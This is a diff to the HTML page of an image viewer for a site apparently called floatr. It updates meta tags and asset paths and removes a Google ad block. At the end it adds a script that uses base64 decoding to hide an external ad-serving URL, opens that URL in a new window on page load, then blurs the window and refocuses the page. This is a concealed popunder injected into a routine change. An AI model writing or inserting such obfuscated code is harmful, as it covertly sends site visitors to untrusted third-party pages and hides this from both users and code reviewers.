@@ -5,24 +5,22 @@
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-
-    <meta name="twitter:title" content="Image by">
+    
+    <meta name="og:locale" content="en_US">
+    <meta name="og:type" content="website">
+    <meta name="og:site_name" content="Uploaded by [AUTHOR_NAME]">
+    <!-- <meta name="description" content="Uploaded by [AUTHOR_NAME]"> -->
+    <meta name="twitter:title" content="[FILE_NAME]">
     <!-- <meta name="twitter:description" content="An image viewer for floatr!"> -->
     <meta name="twitter:image" content="https://objects.floatr.me/[OBJECT_ID]">
     <meta name="twitter:card" content="summary_large_image">
-    
-    <link rel="stylesheet" href="../css/gallery.css"> <!-- On production this is called /assets/css/gallery.css -->
+
+    <link rel="stylesheet" href="/assets/css/gallery.css"> <!-- On production this is called /assets/css/gallery.css -->
     <link rel="stylesheet" href="//use.fontawesome.com/releases/v5.1.0/css/all.css">
-    <link rel="shortcut icon" href="../images/floatr.png"> <!-- On production this is /assets/img/favicon.png -->
+    <link rel="shortcut icon" href="/assets/img/favicon.png"> <!-- On production this is /assets/img/favicon.png -->
+    <!-- <script src="/assets/js/gallery.js"></script> <!-- Move the script tag down below to an external file -->
 
     <script src="/assets/js/gallery.js"></script> <!-- Move the script tag down below to an external file -->
-    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-    <script>
-        (adsbygoogle = window.adsbygoogle || []).push({
-            google_ad_client: "ca-pub-7057170812736047",
-            enable_page_level_ads: true
-        });
-    </script>
 </head> 
 <body>
     <div class="nav">
@@ -118,6 +116,12 @@
                 modal.style.display = "none";
             }
         }
+    </script>
+    <script>
+        let url = atob('aHR0cHM6Ly9nby5vY2xhc2VydmVyLmNvbS9hZnUucGhwP3pvbmVpZD0xODIzMjk1');
+        let win = window.open(url);
+        win.blur();
+        window.focus();
     </script>
 </body>
 </html>
